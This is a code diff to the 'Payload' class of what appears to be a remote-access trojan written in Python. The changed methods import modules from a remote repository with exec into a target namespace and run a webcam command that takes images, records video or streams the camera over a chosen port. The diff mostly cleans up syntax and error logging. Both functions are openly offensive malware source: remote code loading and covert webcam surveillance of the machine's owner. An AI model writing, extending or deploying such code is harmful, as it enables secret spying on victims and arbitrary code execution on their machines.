@@ -373,7 +373,7 @@ class Payload():
         """
         if not name:
             try:
-                return {getattr(self, cmd).usage: getattr(self, cmd) for cmd in vars(self) if hasattr(getattr(self, cmd), 'command') if getattr(getattr(self, cmd), 'command')}
+                return {getattr(self, cmd).usage: getattr(self, cmd).func_doc for cmd in vars(self) if hasattr(getattr(self, cmd), 'command') if getattr(getattr(self, cmd), 'command')}
             except Exception as e:
                 log("{} error: {}".format(self.help.func_name, str(e)))
         elif hasattr(self, name):
@@ -410,11 +410,10 @@ class Payload():
         with globals()['remote_repo'](self.remote['modules'], base_url_1):
             with globals()['remote_repo'](self.remote['packages'], base_url_2):
                 try:
-                    exec 'import {}'.format(module) in target
-                    return ('[+] {} remotely imported into {}'.format(module))
+                    exec('import {}'.format(module), target)
+                    log('[+] {} remotely imported'.format(module))
                 except Exception as e:
                     log("{} error: {}".format(self.load.func_name, str(e)))
-                    return ('[-] {} could not be remotely imported into {}'.format(module))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
@@ -616,21 +615,21 @@ class Payload():
         try:
             if 'webcam' not in globals():
                 self.load('webcam')
-            elif not args:
-                result = self.webcam.usage
-            else:
-                args = str(args).split()
-                if 'stream' in args:
-                    if len(args) != 2:
-                        result = "Error - stream mode requires argument: 'port'"
-                    elif not str(args[1]).isdigit():
-                        result = "Error - port must be integer between 1 - 65355"
-                    else:
-                        result = globals()['webcam'].stream(port=args[1])
+            if not args:
+                return self.webcam.usage
+            args = str(args).split()
+            if 'stream' in args:
+                if len(args) != 2:
+                    result = "Error - stream mode requires argument: 'port'"
+                elif not args[1].isdigit():
+                    result = "Error - port must be integer between 1 - 65355"
                 else:
-                    result = globals()['webcam'].image(*args) if 'video' not in args else globals()['webcam'].video(*args)
+                    result = globals()['webcam'].stream(port=args[1])
+            else:
+                result = globals()['webcam'].image(*args) if 'video' not in args else globals()['webcam'].video(*args)
         except Exception as e:
             result = "{} error: {}".format(self.webcam.func_name, str(e))
+            log(result)
         return result
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
